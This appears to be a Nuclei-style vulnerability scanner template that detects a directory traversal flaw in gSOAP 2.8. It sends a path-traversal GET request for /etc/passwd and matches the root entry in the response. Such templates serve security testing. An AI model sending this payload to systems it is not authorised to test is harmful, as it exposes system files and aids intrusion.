id: gsoap-lfi

info:
  name: gSOAP 2.8 - Directory Traversal
  author: 0x_Akoko
  severity: high
  reference: https://www.exploit-db.com/exploits/47653
  tags: gsoap,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/../../../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
